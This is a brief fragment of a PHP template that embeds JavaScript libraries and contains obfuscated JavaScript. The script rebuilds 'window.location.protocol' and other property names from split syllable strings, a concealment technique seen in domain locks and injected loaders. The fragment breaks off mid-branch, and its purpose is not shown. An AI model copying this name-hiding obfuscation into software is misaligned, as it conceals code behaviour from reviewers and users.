...
?>
var $e = 'ca lo me on ti st na ho ol ot pr oc'.split(' ');
var $w = window;
<?php
...
var $l = $h;
var $p = $w[$e[1]+$e[0]+$e[4]+$e[3]][$e[10]+$e[9]+$e[11]+$e[8]];
<?php
require '../js/jstat.min.js';
?>
var $d = 'pr ty to o pe .x ni sa om .c sty ev .d l ho ca st le fi'.split(' ');
var $x = $l;
<?php
...
require '../jquery-calx-2.2.2.min.js';
?>
}else{
